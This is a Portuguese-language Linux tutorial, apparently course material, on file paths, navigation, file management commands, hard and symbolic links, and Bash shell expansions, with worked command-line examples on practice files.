Importante Um caractere de espaço é aceitável como parte de um nome de arquivo do Linux. No entanto, espaços também são usados pelo shell para separar opções e argumentos na linha de comando. Se você inserir um comando que inclua um arquivo que tenha um espaço no nome, o shell poderá interpretar erroneamente o comando e entender que você deseja iniciar um novo nome de arquivo ou outro argumento no espaço.
É possível evitar isso colocando nomes de arquivos entre aspas. No entanto, se você não precisar usar espaços em nomes de arquivos, pode ser mais simples simplesmente evitá-los.
=&amp;gt; Caminhos absolutos
Um caminho absoluto é um nome totalmente qualificado, especificando a localização exata dos arquivos na hierarquia do sistema de arquivos. Ele começa no diretório raiz (/) e especifica cada subdiretório que deve ser percorrido para alcançar o arquivo específico. Cada arquivo em um sistema de arquivos tem um nome de caminho absoluto exclusivo, reconhecido por uma regra simples: um nome de arquivo com uma barra (/) como primeiro caractere é um nome de caminho absoluto. Por exemplo, o nome de caminho absoluto do arquivo de log do sistema de mensagens é /var/log/messages. Nomes de caminhos absolutos podem ser longos, por isso, os arquivos também podem ser localizados em relação ao diretório de trabalho atual para o prompt do shell.
=&amp;gt; O diretório de trabalho atual e caminhos relativos
Quando um usuário fizer login e abrir uma janela de comando, normalmente a localização inicial será o diretório pessoal do usuário. Os processos do sistema também têm um diretório inicial. Usuários e processos navegam a outros diretórios, conforme necessário; os termos diretório de trabalho ou diretório de trabalho atual são referentes ao local atual.
Assim como um caminho absoluto, um caminho relativo identifica um único arquivo, especificando somente o caminho necessário para acessar o arquivo no diretório de trabalho local. O reconhecimento de nomes de caminho relativos segue uma regra simples: um nome de caminho com qualquer caractere diferente de uma barra como primeiro caractere é um nome de caminho relativo. Um usuário no diretório /var pode fazer referência ao arquivo de log de mensagens de modo relativo como log/messages.
Sistemas de arquivos Linux, incluindo, entre outros, ext4, XFS, GFS2 e GlusterFS, diferenciam maiúsculas de minúsculas. A criação de FileCase.txt e filecase.txt no mesmo diretório resulta em dois arquivos exclusivos.
Sistemas de arquivos que não são do Linux podem funcionar de modo diferente. Por exemplo, o VFAT, o NTFS da Microsoft e o HFS&#43; da Apple, têm um comportamento de preservação de maiúsculas e minúsculas. Embora esses sistemas de arquivos não diferenciem maiúsculas de minúsculas, eles exibem os nomes de arquivo com as letras originais usada durante a criação do arquivo. Portanto, se você tentou criar os arquivos no exemplo anterior em um sistema de arquivos VFAT, ambos os nomes seriam tratados como apontando para o mesmo arquivo em vez de dois arquivos diferentes.
Caminhos de navegação
O comando pwd exibe o nome do caminho completo do diretório de trabalho atual para esse shell. Isso pode ajudar você a determinar a sintaxe para acessar arquivos usando nomes de caminho relativos. O comando ls lista o conteúdo do diretório especificado ou, caso um diretório não seja fornecido, do diretório de trabalho atual.
[user@host ~]$ pwd /home/user [user@host ~]$ ls Desktop Documents Downloads Music Pictures Public Templates Videos [user@host ~]$ Use o comando cd para alterar o diretório de trabalho atual do shell. Se você não especificar nenhum argumento para o comando, ele será alterado para o diretório pessoal.
No exemplo a seguir, uma mistura de caminhos absolutos e relativos é usada com o comando cd para alterar o diretório de trabalho atual para o shell.
[user@host ~]$ pwd /home/user [user@host ~]$ cd Videos [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd /home/user/Documents [user@host Documents]$ pwd /home/user/Documents [user@host Documents]$ cd [user@host ~]$ pwd /home/user [user@host ~]$ Como você pode ver no exemplo anterior, o prompt de shell padrão também exibe o último componente do caminho absoluto para o diretório de trabalho atual.
Por exemplo, para /home/user/Videos, somente Videos é exibido. O prompt exibe o caractere til &amp;lsquo;~&amp;rsquo; quando o diretório de trabalho atual é o diretório pessoa.
O comando touch normalmente atualiza o carimbo de data e hora de um arquivo para a data e a hora atuais, sem modificá-lo. Isso é útil para a criação de arquivos vazios, que podem ser usados para prática, pois o uso desse comando em um nome de arquivo que não existe faz com que o arquivo seja criado. No exemplo a seguir, o comando touch cria arquivos de prática nos subdiretórios Documents e Videos.
[user@host ~]$ touch Videos/blockbuster1.ogg [user@host ~]$ touch Videos/blockbuster2.ogg [user@host ~]$ touch Documents/thesis_chapter1.odf [user@host ~]$ touch Documents/thesis_chapter2.odf [user@host ~]$ O comando ls tem várias opções para a exibição de atributos nos arquivos. As mais comuns e úteis são -l (formato de listagem longa), -a (todos os arquivos, incluindo os ocultos) e -R (recursão, para incluir o conteúdo de todos os subdiretórios).
[user@host ~]$ ls -l total 15 drwxr-xr-x. 2 user user 4096 Feb 7 14:02 Desktop drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Documents drwxr-xr-x. 3 user user 4096 Jan 9 15:00 Downloads drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Music drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Pictures drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Public drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Templates drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Videos [user@host ~]$ ls -la total 15 drwx------. 16 user user 4096 Feb 8 16:15 . drwxr-xr-x. 6 root root 4096 Feb 8 16:13 .. -rw-------. 1 user user 22664 Feb 8 00:37 .bash_history -rw-r--r--. 1 user user 18 Jul 9 2013 .bash_logout -rw-r--r--. 1 user user 176 Jul 9 2013 .bash_profile -rw-r--r--. 1 user user 124 Jul 9 2013 .bashrc drwxr-xr-x. 4 user user 4096 Jan 20 14:02 .cache drwxr-xr-x. 8 user user 4096 Feb 5 11:45 .config drwxr-xr-x. 2 user user 4096 Feb 7 14:02 Desktop drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Documents drwxr-xr-x. 3 user user 4096 Jan 25 20:48 Downloads drwxr-xr-x. 11 user user 4096 Feb 6 13:07 .gnome2 drwx------. 2 user user 4096 Jan 20 14:02 .gnome2_private -rw-------. 1 user user 15190 Feb 8 09:49 .ICEauthority drwxr-xr-x. 3 user user 4096 Jan 9 15:00 .local drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Music drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Pictures drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Public drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Templates drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Videos [user@host ~]$ Os dois diretórios especiais no topo da lista se referem ao diretório atual (.) e ao diretório pai (..). Esses diretórios especiais existem em todos os diretórios do sistema. Você descobrirá a utilidade deles quando começar a usar comandos de gerenciamento de arquivos.
Importante Nomes de arquivos começando com um ponto (.) indicam arquivos ocultos; não é possível visualizá-los na exibição normal usando ls e outros comando. Esse não é um recurso de segurança. Os arquivos ocultos impedem que os arquivos de configuração do usuário necessários sobrecarreguem diretórios pessoais. Muitos comandos processam arquivos ocultos apenas com opções de linha de comando especificas, evitando que a configuração de um usuário seja acidentalmente copiada para outros diretórios ou usuários.
Proteger o conteúdo dos arquivos de visualizações inadequadas exige o uso de permissões de arquivo.
[user@host ~]$ ls -R .: Desktop Documents Downloads Music Pictures Public Templates Videos ./Desktop: ./Documents: thesis_chapter1.odf thesis_chapter2.odf ./Downloads: ./Music: ./Pictures: ./Public: ./Templates: ./Videos: blockbuster1.ogg blockbuster2.ogg [user@host ~]$ O comando cd tem várias opções. Algumas são tão úteis que é importante praticá-las o mais cedo possível e usá-las com frequência. O comando cd - passa para o diretório anterior, no qual o usuário estava antes do diretório atual. O exemplo a seguir ilustra esse comportamento, alternando entre dois diretórios, o que é útil ao processar uma série de tarefas semelhantes.
[user@host ~]$ cd Videos [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd /home/user/Documents [user@host Documents]$ pwd /home/user/Documents [user@host Documents]$ cd - [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd - [user@host Documents]$ pwd /home/user/Documents [user@host Documents]$ cd - [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd [user@host ~]$ O comando cd .. usa o diretório oculto .. para subir um nível até o diretório pai sem precisar saber o nome exato desse diretório. O outro diretório oculto (.) especifica o diretório atual nos comandos em que a localização atual é o argumento de origem ou de destino, evitando a necessidade de digitar o nome de caminho absoluto do diretório.
[user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd . [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd .. [user@host ~]$ pwd /home/user [user@host ~]$ cd .. [user@host home]$ pwd /home [user@host home]$ cd .. [user@host /]$ pwd / [user@host /]$ cd [user@host ~]$ pwd /home/user [user@host ~]$ Gerenciamento de arquivos usando ferramentas de linha de comando Para gerenciar arquivos, você precisa ser capaz de criar, remover, copiar e mover os arquivos. Você também precisa organizá-los logicamente em diretórios, os quais você também precisa ser capaz de criar, remover, copiar e mover.
A tabela a seguir resume alguns dos comandos mais comuns de gerenciamento de arquivos. O restante desta seção discutirá maneiras de usar esses comandos em mais detalhes.
Atividade =&amp;gt; Sintaxe do comando Criar um novo diretório =&amp;gt; mkdir directory Copiar um arquivo =&amp;gt; cp file new-file Copiar um diretório e seu conteúdo =&amp;gt; cp -r directory new-directory Mover ou renomear um arquivo ou diretório =&amp;gt; mv file new-file Remover um arquivo =&amp;gt; rm file Remover um diretório contendo arquivos =&amp;gt; rm -r directory Remover um diretório vazio =&amp;gt; rmdir directory
Criação de diretórios O comando mkdir cria um ou mais diretórios ou subdiretórios. Ele considera como argumentos uma lista de caminhos para os diretórios que você deseja criar.
O comando mkdir falhará com um erro se o diretório já existir ou se você estiver tentando criar um subdiretório em um diretório que não existe. A opção -p (pai) cria diretórios pais ausentes para o destino solicitado. Tenha cautela ao usar o comando mkdir -p pois erros de digitação acidentais podem criar diretórios não pretendidos sem gerar mensagens de erro.
No exemplo a seguir, digamos que você está tentando criar um diretório no Videosdiretório nomeadoWatched, mas acidentalmente deixou a letra &amp;ldquo;s&amp;rdquo; em Videos no comando mkdir.
[user@host ~]$ mkdir Video/Watched mkdir: cannot create directory `Video/Watched&amp;#39;: No such file or directory O comando mkdir falhou porque Videos foi digitado incorretamente e o diretório Video não existe. Se você tivesse usado o comando mkdir com a opção -p, o diretório Video seria criado, o que não era o pretendido, e o subdiretório Watched seria criado nesse diretório incorreto.
Depois de escrever corretamente o diretório pai Videos, a criação do subdiretório Watched será bem-sucedida.
[user@host ~]$ mkdir Videos/Watched [user@host ~]$ ls -R Videos Videos/: blockbuster1.ogg blockbuster2.ogg Watched Videos/Watched: No exemplo a seguir, os arquivos e diretórios são organizados abaixo do diretório /home/user/Documents. Use o comando mkdir e uma lista de nomes de diretórios separada por espaços para criar vários diretórios.
[user@host ~]$ cd Documents [user@host Documents]$ mkdir ProjectX ProjectY [user@host Documents]$ ls ProjectX ProjectY Use o comando mkdir -p e caminhos relativos separados por espaços para cada um dos nomes de subdiretórios para criar vários diretórios pai com subdiretórios.
[user@host Documents]$ mkdir -p Thesis/Chapter1 Thesis/Chapter2 Thesis/Chapter3 [user@host Documents]$ cd [user@host ~]$ ls -R Videos Documents Documents: ProjectX ProjectY Thesis Documents/ProjectX: Documents/ProjectY: Documents/Thesis: Chapter1 Chapter2 Chapter3 Documents/Thesis/Chapter1: Documents/Thesis/Chapter2: Documents/Thesis/Chapter3: Videos: blockbuster1.ogg blockbuster2.ogg Watched Videos/Watched: O último comando mkdir criou subdiretórios de três subdiretórios ChapterN com um comando. A opção -p criou o diretório pai Thesis ausente.
Cópia de arquivos O comando cp copia um arquivo, criando um novo arquivo no diretório atual ou em um diretório especificado. Ele também pode copiar vários arquivos para um diretório.
Atenção Se o arquivo de destino já existir, o comando cp substitui o arquivo.
[user@host ~]$ cd Videos [user@host Videos]$ cp blockbuster1.ogg blockbuster3.ogg [user@host Videos]$ ls -l total 0 -rw-rw-r--. 1 user user 0 Feb 8 16:23 blockbuster1.ogg -rw-rw-r--. 1 user user 0 Feb 8 16:24 blockbuster2.ogg -rw-rw-r--. 1 user user 0 Feb 8 16:34 blockbuster3.ogg drwxrwxr-x. 2 user user 4096 Feb 8 16:05 Watched [user@host Videos] Ao copiar vários arquivos com um comando, o último argumento deverá ser um diretório. Os arquivos copiados mantêm seus nomes originais no novo diretório. Se um arquivo com o mesmo nome existir no diretório de destino, o arquivo existente será substituído. Por padrão, o cp não copia diretórios, mas os ignora.
No exemplo a seguir, dois diretórios são listados, Thesis e ProjectX. Apenas o último argumento, ProjectX, é válido como destino. O diretório Thesis é ignorado.
[user@host Videos]$ cd ../Documents [user@host Documents]$ cp thesis_chapter1.odf thesis_chapter2.odf Thesis ProjectX cp: omitting directory `Thesis&amp;#39; [user@host Documents]$ ls Thesis ProjectX ProjectX: thesis_chapter1.odf thesis_chapter2.odf Thesis: Chapter1 Chapter2 Chapter3 No primeiro comando cp, a cópia do diretório Thesis falhou, mas os arquivos thesis_chapter1.odf e thesis_chapter2.odf foram copiados com êxito.
Se você desejar copiar um arquivo para o diretório de trabalho atual, poderá usar o diretório .:
[user@host ~]$ cp /etc/hostname . [user@host ~]$ cat hostname host.example.com [user@host ~]$ Use o comando copy com a opção -r (recursiva) para copiar o diretório Thesis e seu conteúdo para o diretório ProjectX.
[user@host Documents]$ cp -r Thesis ProjectX [user@host Documents]$ ls -R ProjectX ProjectX: Thesis thesis_chapter1.odf thesis_chapter2.odf ProjectX/Thesis: Chapter1 Chapter2 Chapter3 ProjectX/Thesis/Chapter1: ProjectX/Thesis/Chapter2: thesis_chapter2.odf ProjectX/Thesis/Chapter3: Movimentação de arquivos O comando mv move arquivos de um local para outro. Se você pensar no caminho absoluto para um arquivo como seu nome completo, mover um arquivo será efetivamente o mesmo que renomear um arquivo. O conteúdo do arquivo permanecerá inalterado.
Use o comando mv para renomear um arquivo.
[user@host Videos]$ cd ../Documents [user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter1.odf -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2.odf [user@host Documents]$ mv thesis_chapter2.odf thesis_chapter2_reviewed.odf [user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter1.odf -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2_reviewed.odf Use o comando mv para mover um arquivo para outro diretório.
[user@host Documents]$ ls Thesis/Chapter1 [user@host Documents]$ [user@host Documents]$ mv thesis_chapter1.odf Thesis/Chapter1 [user@host Documents]$ ls Thesis/Chapter1 thesis_chapter1.odf [user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2_reviewed.odf Remoção de arquivos e diretórios O comando rm remove arquivos. Por padrão, rm não removerá diretórios que contenham arquivos, a menos que você adicione as opções -r ou &amp;ndash;recursive.
Importante Não existe um recurso de cancelamento de exclusão na linha de comando ou uma Lixeira da qual restaurar arquivos programados para exclusão.
É uma boa ideia verificar seu diretório de trabalho atual antes de remover um arquivo ou diretório.
[user@host Documents]$ pwd /home/student/Documents Use o comando rm para remover um único arquivo do seu diretório de trabalho.
[user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2_reviewed.odf [user@host Documents]$ rm thesis_chapter2_reviewed.odf [user@host Documents]$ ls -l thesis* ls: cannot access &amp;#39;thesis*&amp;#39;: No such file or directory Se você tentar usar o comando rm para remover um diretório sem usar a opção -r, o comando falhará.
[user@host Documents]$ rm Thesis/Chapter1 rm: cannot remove `Thesis/Chapter1&amp;#39;: Is a directory Use o comando rm -r para remover um subdiretório e seu conteúdo.
[user@host Documents]$ ls -R Thesis Thesis/: Chapter1 Chapter2 Chapter3 Thesis/Chapter1: thesis_chapter1.odf Thesis/Chapter2: thesis_chapter2.odf Thesis/Chapter3: [user@host Documents]$ rm -r Thesis/Chapter1 [user@host Documents]$ ls -l Thesis total 8 drwxrwxr-x. 2 user user 4096 Feb 11 12:47 Chapter2 drwxrwxr-x. 2 user user 4096 Feb 11 12:48 Chapter3 O comando rm -r percorre cada subdiretório primeiro, removendo individualmente seus arquivos antes de remover cada diretório. Você pode usar o comando rm -ri para solicitar interativamente a confirmação antes da exclusão. Isso é essencialmente o oposto de usar a opção -f, que força a remoção sem solicitar a confirmação do usuário.
[user@host Documents]$ rm -ri Thesis rm: descend into directory `Thesis&amp;#39;? y rm: descend into directory `Thesis/Chapter2&amp;#39;? y rm: remove regular empty file `Thesis/Chapter2/thesis_chapter2.odf&amp;#39;? y rm: remove directory `Thesis/Chapter2&amp;#39;? y rm: remove directory `Thesis/Chapter3&amp;#39;? y rm: remove directory `Thesis&amp;#39;? y [user@host Documents]$ Atenção Se você especificar as opções -i e -f, a opção -f tem prioridade e você não será solicitado para confirmação antes que rm exclua arquivos.
No exemplo a seguir, o comando rmdir remove apenas o diretório que está vazio. Assim como no exemplo anterior, você deve usar o comando rm -r para remover um diretório que contenha conteúdo.
[user@host Documents]$ pwd /home/student/Documents [user@host Documents]$ rmdir ProjectY [user@host Documents]$ rmdir ProjectX rmdir: failed to remove `ProjectX&amp;#39;: Directory not empty [user@host Documents]$ rm -r ProjectX [user@host Documents]$ ls -lR .: total 0 [user@host Documents]$ O comando rm sem opções não pode remover um diretório vazio. Você deve usar os comandos rmdir, rm -d (que é equivalente a rmdir) ou rm -r.
Criação de links entre arquivos É possível criar vários nomes que apontam para o mesmo arquivo. Existem duas maneiras de fazer isso: criando um link físico para o arquivo ou criando um link simbólico (às vezes chamado de ligação simbólica) para o arquivo. Cada um tem suas vantagens e desvantagens.
Criação de links físicos Todo arquivo inicia com um único link físico, desde seu nome inicial até os dados no sistema de arquivos. Quando você cria um novo link físico para um arquivo, cria outro nome que aponta para os mesmos dados. O novo link físico age exatamente como o nome do arquivo original. Uma vez criado, você não verá diferença entre o novo link físico e o nome original do arquivo.
Você pode descobrir se um arquivo tem vários links físicos com o comando ls -l. Uma das coisas que ele relata é a contagem de links de cada arquivo, o número de links físicos que o arquivo possui.
[user@host ~]$ pwd /home/user [user@host ~]$ ls -l newfile.txt -rw-r--r--. 1 user user 0 Mar 11 19:19 newfile.txt No exemplo anterior, a contagem de links de newfile.txt é 1. Ele tem exatamente um caminho absoluto, que é /home/user/newfile.txt .
Você pode usar o comando ln para criar um novo link físico (outro nome) que aponte para um arquivo existente. O comando precisa de pelo menos dois argumentos, um caminho para o arquivo existente e o caminho para o link físico que você deseja criar.
O exemplo a seguir cria um link físico chamado newfile-link2.txt para o arquivo existente newfile.txt no diretório /tmp.
[user@host ~]$ ln newfile.txt /tmp/newfile-hlink2.txt [user@host ~]$ ls -l newfile.txt /tmp/newfile-hlink2.txt -rw-rw-r--. 2 user user 12 Mar 11 19:19 newfile.txt -rw-rw-r--. 2 user user 12 Mar 11 19:19 /tmp/newfile-hlink2.txt Se você desejar descobrir se dois arquivos são links físicos um do outro, uma maneira é usar a opção -i com o comando ls para listar o número de inode dos arquivos. Se os arquivos estiverem no mesmo sistema de arquivos (discutido a seguir) e seus números de inode forem os mesmos, os arquivos são links físicos apontando para os mesmos dados.
[user@host ~]$ ls -il newfile.txt /tmp/newfile-hlink2.txt 8924107 -rw-rw-r--. 2 user user 12 Mar 11 19:19 newfile.txt 8924107 -rw-rw-r--. 2 user user 12 Mar 11 19:19 /tmp/newfile-hlink2.txt Importante Todos os links físicos que fazem referência ao mesmo arquivo terão as mesmas permissões, contagem de links, propriedade de usuário e grupo, carimbos de data e hora e conteúdo de arquivo. Se uma dessas informações for alterada em um link físico, todos os outros links físicos que apontem para o mesmo arquivo também exibirão a nova informação. Isso ocorre porque cada link físico aponta para os mesmos dados no dispositivo de armazenamento.
Mesmo que o arquivo original seja excluído, o conteúdo do arquivo ainda estará disponível, desde que pelo menos um link físico exista. Os dados só são excluídos do armazenamento quando o último link físico é excluído.
[user@host ~]$ rm -f newfile.txt [user@host ~]$ ls -l /tmp/newfile-hlink2.txt -rw-rw-r--. 1 user user 12 Mar 11 19:19 /tmp/newfile-hlink2.txt [user@host ~]$ cat /tmp/newfile-hlink2.txt Hello World Limitações de links físicos Os links físicos têm algumas limitações. Em primeiro lugar, os links físicos só podem ser usados com arquivos regulares. Você não pode usar ln para criar um link físico para um diretório ou arquivo especial.
Em segundo lugar, os links físicos só podem ser usados se ambos os arquivos estiverem no mesmo sistema de arquivos. A hierarquia do sistema de arquivos pode ser composta de vários dispositivos de armazenamento. Dependendo da configuração do sistema, quando você mudar para um novo diretório, esse diretório e seu conteúdo poderão ser armazenados em um sistema de arquivos diferente.
Você pode usar o comando df para listar os diretórios que estão em sistemas de arquivos diferentes. Por exemplo, você pode ver a saída desta maneira:
[user@host ~]$ df Filesystem 1K-blocks Used Available Use% Mounted on devtmpfs 886788 0 886788 0% /dev tmpfs 902108 0 902108 0% /dev/shm tmpfs 902108 8696 893412 1% /run tmpfs 902108 0 902108 0% /sys/fs/cgroup /dev/mapper/rhel_rhel8--root 10258432 1630460 8627972 16% / /dev/sda1 1038336 167128 871208 17% /boot tmpfs 180420 0 180420 0% /run/user/1000 [user@host ~]$ Arquivos em dois diretórios &amp;ldquo;montados em&amp;rdquo; diferentes e seus subdiretórios estão em sistemas de arquivos diferentes. (A correspondência mais específica vence.) Assim, no sistema deste exemplo, você pode criar um link físico entre /var/tmp/link1 e /home/user/file porque ambos são subdiretórios de / mas não de qualquer outro diretório na lista. No entanto, você não pode criar um link físico entre /boot/test/badlink e /home/user/file porque o primeiro arquivo está em um subdiretório de /boot (na lista &amp;ldquo;montado em&amp;rdquo;) e o segundo arquivo não.
Criação de softlinks O comando ln -s cria um softlink, também chamado de &amp;ldquo;link simbólico&amp;rdquo;. Um link simbólico não é um arquivo normal, mas um tipo especial de arquivo que aponta para outro arquivo ou diretório existente.
Os links simbólicos têm algumas vantagens sobre links físicos:
=&amp;gt; Eles podem vincular dois arquivos em diferentes sistemas de arquivos.
=&amp;gt; Eles podem apontar para um diretório ou arquivo especial, não apenas um arquivo comum.
No exemplo a seguir, o comando ln -s é usado para criar um novo link flexível para o arquivo existente /home/user/newfile-link2.txt que será nomeado /tmp/newfile-symlink.txt.
[user@host ~]$ ln -s /home/user/newfile-link2.txt /tmp/newfile-symlink.txt [user@host ~]$ ls -l newfile-link2.txt /tmp/newfile-symlink.txt -rw-rw-r--. 1 user user 12 Mar 11 19:19 newfile-link2.txt lrwxrwxrwx. 1 user user 11 Mar 11 20:59 /tmp/newfile-symlink.txt -&amp;gt; /home/user/newfile-link2.txt [user@host ~]$ cat /tmp/newfile-symlink.txt Soft Hello World No exemplo anterior, o primeiro caractere da listagem longa para /tmp/newfile-symlink.txt é l, em vez de -. Isso indica que o arquivo é um link simbólico e não um arquivo normal. (Um d indicaria que o arquivo é um diretório.)
Quando o arquivo regular original é excluído, o link simbólico continua apontando para o arquivo, mas o destino some. Um link simbólico que esteja apontando para um arquivo ausente é denominado &amp;ldquo;link simbólico pendente&amp;rdquo;.
[user@host ~]$ rm -f newfile-link2.txt [user@host ~]$ ls -l /tmp/newfile-symlink.txt lrwxrwxrwx. 1 user user 11 Mar 11 20:59 /tmp/newfile-symlink.txt -&amp;gt; /home/user/newfile-link2.txt [user@host ~]$ cat /tmp/newfile-symlink.txt cat: /tmp/newfile-symlink.txt: No such file or directory Importante
Um efeito colateral do link simbólico pendente no exemplo anterior é que, se você criar posteriormente um novo arquivo com o mesmo nome do arquivo excluído (/home/user/newfile-link2.txt), o link não estará mais &amp;ldquo;pendurado&amp;rdquo; e apontará para o novo arquivo.
Os links físicos não funcionam assim. Se você excluir um link físico e, em seguida, usar ferramentas normais ( ao invés de ln) para criar um novo arquivo com o mesmo nome, o novo arquivo não será vinculado ao arquivo antigo.
Uma maneira de comparar links físicos e links simbólicos que pode ajudar você a entender como eles funcionam:
=&amp;gt; Um link físico aponta um nome para dados em um dispositivo de armazenamento
=&amp;gt; Um link simbólico aponta um nome para outro nome, que aponta para dados em um dispositivo de armazenamento
Um link simbólico pode apontar para um diretório. Nesse caso, o link simbólico atuará como um diretório. Alterar para o link simbólico com cd fará com que o diretório de trabalho atual seja o diretório vinculado. Algumas ferramentas podem acompanhar o fato de você ter seguido um link simbólico para chegar lá. Por exemplo, por padrão cd atualizará seu diretório de trabalho atual usando o nome do link simbólico, em vez do nome do diretório real. (Existe uma opção, -P, que o atualizará com o nome do diretório real.)
No exemplo a seguir, um link simbólico denominado /home/user/configfiles é criado que aponta para o diretório /etc.
[user@host ~]$ ln -s /etc /home/user/configfiles [user@host ~]$ cd /home/user/configfiles [user@host configfiles]$ pwd /home/user/configfiles Correspondência de nomes de arquivos com expansões de shell O shell Bash apresenta várias maneiras de expandir uma linha de comando, incluindo a correspondência de padrões, a expansão de diretório pessoal, a expansão de string e a substituição de variável. Talvez a mais poderosa delas seja a capacidade de correspondência de nome de caminhos, historicamente chamada de globbing. O recurso de globbing do Bash, por vezes chamado de “wildcards”, facilita o gerenciamento de grandes números de arquivos. Ao usar metacaracteres que se “expandem” para corresponder a nomes de caminho e de arquivo que são procurados, os comandos são executados em um conjunto específico de arquivos de uma só vez.
Correspondência de padrões
Globbing é uma operação de análise de comandos do shell que expande um padrão de caracteres curinga em uma lista de nomes de caminho correspondentes. Metacaracteres de linha de comando são substituídos pela lista de correspondência antes da execução do comando. Os padrões que não retornam correspondências exibem a solicitação de padrão original como texto literal. Os itens a seguir são metacaracteres e classes de padrões comuns.
Tabela 3.3. Tabela de metacaracteres e correspondências
* =&amp;gt; Qualquer string com zero ou mais caracteres. ? =&amp;gt; Qualquer caractere único. [abc...] =&amp;gt; Qualquer caractere na classe entre colchetes. [!abc...] =&amp;gt; Qualquer caractere que não esteja na classe entre colchetes. [^abc...] =&amp;gt; Qualquer caractere que não esteja na classe entre colchetes. [[:alpha:]] =&amp;gt; Qualquer caractere alfabético. [[:lower:]] =&amp;gt; Qualquer caractere em minúsculas. [[:upper:]] =&amp;gt; Qualquer caractere em maiúsculas. [[:alnum:]] =&amp;gt; Qualquer caractere alfabético ou numérico. [[:punct:]] =&amp;gt; Qualquer caractere imprimível que não seja alfanumérico nem um espaço. [[:digit:]] =&amp;gt; Qualquer dígito único de 0 a 9. [[:space:]] =&amp;gt; Qualquer caractere de espaço único. Isso pode incluir recuos, novas linhas, retornos, avanços de página ou espaços. Para os próximos exemplos, digamos que você executou os comandos a seguir para criar alguns arquivos de amostra.
[user@host ~]$ mkdir glob; cd glob [user@host glob]$ touch alfa bravo charlie delta echo able baker cast dog easy [user@host glob]$ ls able alfa baker bravo cast charlie delta dog easy echo [user@host glob]$ O primeiro exemplo usará combinações de padrão simples com os caracteres asterisco * e ponto de interrogação &amp;lsquo;?&amp;rsquo; e uma classe de caracteres para corresponder a alguns desses nomes de arquivo.
Expansão de til O caractere til &amp;lsquo;~&amp;rsquo; corresponde ao diretório pessoal do usuário atual. Se uma string diferente de uma barra &amp;lsquo;/&amp;rsquo; for iniciada, o shell interpretará a string até essa barra como um nome de usuário, se houver uma correspondência, e substituirá a cadeia pelo caminho absoluto para o diretório pessoal desse usuário. Se nenhum nome de usuário for correspondente, um til real seguido da string será usado.
No exemplo a seguir, o comando echo é usado para exibir o valor do caractere til. O comando echo também pode ser usado para exibir os valores de chaves e caracteres de expansão de variáveis, entre outros.
[user@host glob]$ echo ~root /root [user@host glob]$ echo ~user /home/user [user@host glob]$ echo ~/glob /home/user/glob [user@host glob]$ Expansão de chave A expansão de chave é usada para gerar strings de caracteres distintas. As chaves contêm uma lista de strings separadas por vírgula ou uma expressão de sequência. O resultado inclui o texto anterior ou o posterior à definição de chave. As expansões de chave podem ser aninhadas uma dentro da outra. Além disso, a sintaxe de dois pontos (..) é expandida para uma sequência tal que {m..p} será expandido para m n o p.
[user@host glob]$ echo {Sunday,Monday,Tuesday,Wednesday}.log Sunday.log Monday.log Tuesday.log Wednesday.log [user@host glob]$ echo file{1..3}.txt file1.txt file2.txt file3.txt [user@host glob]$ echo file{a..c}.txt filea.txt fileb.txt filec.txt [user@host glob]$ echo file{a,b}{1,2}.txt filea1.txt filea2.txt fileb1.txt fileb2.txt [user@host glob]$ echo file{a{1,2},b,c}.txt filea1.txt filea2.txt fileb.txt filec.txt [user@host glob]$ Um uso prático da expansão de chaves é criar rapidamente vários arquivos ou diretórios.
[user@host glob]$ mkdir ../RHEL{6,7,8} [user@host glob]$ ls ../RHEL* RHEL6 RHEL7 RHEL8 [user@host glob]$ Expansão variável Uma variável age como um contêiner nomeado que pode armazenar um valor na memória. As variáveis facilitam o acesso e modificam os dados armazenados a partir da linha de comando ou dentro de um script de shell.
Você pode atribuir dados como um valor a uma variável usando a seguinte sintaxe:
[user@host ~]$ VARIABLENAME=value Você pode usar a expansão variável para converter o nome da variável para o valor na linha de comando. Se uma string começar com um cifrão ($), o shell tentará usar o restante dessa cadeia como um nome de variável e o substituirá por qualquer valor que a variável tenha.
[user@host ~]$ USERNAME=operator [user@host ~]$ echo $USERNAME operator Para ajudar a evitar erros devido a outras expansões de shell, você pode colocar o nome da variável entre chaves, por exemplo ${VARIABLENAME} .
[user@host ~]$ USERNAME=operator [user@host ~]$ echo ${USERNAME} operator As variáveis do shell e as formas de usá-las serão abordadas com mais profundidade posteriormente neste curso.
Substituição de comandos A substituição de comandos permite que a saída de um comando substitua o próprio comando. A substituição de comandos ocorre quando um comando é colocado entre parênteses e precedido por um cifrão ($). A forma $(command) pode aninhar várias expansões de comandos, uma dentro da outra.
[user@host glob]$ echo Today is $(date &#43;%A). Today is Wednesday. [user@host glob]$ echo The time is $(date &#43;%M) minutes past $(date &#43;%l%p). The time is 26 minutes past 11AM. [user@host glob]$ Proteção de argumentos da expansão Vários caracteres têm significado especial no shell Bash. Para evitar que o shell execute expansões de shell em partes de sua linha de comando, você pode usar aspas e escapes em caracteres e strings.
A barra invertida () é um caractere de escape no shell Bash. Ela protegerá contra expansão o caractere que vem imediatamente depois.
